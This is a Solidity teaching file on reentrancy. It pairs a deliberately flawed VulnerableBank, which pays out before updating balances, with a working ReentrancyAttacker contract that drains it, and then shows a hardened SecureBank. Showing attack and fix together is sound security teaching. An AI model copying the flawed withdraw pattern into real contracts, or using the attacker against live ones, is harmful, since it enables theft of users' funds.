// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/**
 * @title VulnerableBank
 * @notice Flawed contract violating Checks-Effects-Interactions (CEI).
 *         Transfers ETH *before* updating the user's balance.
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Zero balance");

        // VULNERABILITY: External call before state update!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update happens too late
        balances[msg.sender] = 0;
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Exploits VulnerableBank by re-entering withdraw() in receive()
 */
contract ReentrancyAttacker {
    VulnerableBank public immutable bank;
    address public immutable owner;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Unauthorized");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function drain() external {
        require(msg.sender == owner, "Unauthorized");
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title SecureBank
 * @notice Hardened contract implementing Checks-Effects-Interactions (CEI) & ReentrancyGuard.
 */
contract SecureBank {
    error ZeroBalance();
    error TransferFailed();
    error ReentrancyGuardLocked();

    mapping(address => uint256) public balances;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        if (_locked == 2) revert ReentrancyGuardLocked();
        _locked = 2;
        _;
        _locked = 1;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        if (balance == 0) revert ZeroBalance();

        // 1. CHECKS: above
        // 2. EFFECTS: Update state BEFORE external call
        balances[msg.sender] = 0;

        // 3. INTERACTIONS: External call last
        (bool success, ) = msg.sender.call{value: balance}("");
        if (!success) revert TransferFailed();
    }
}
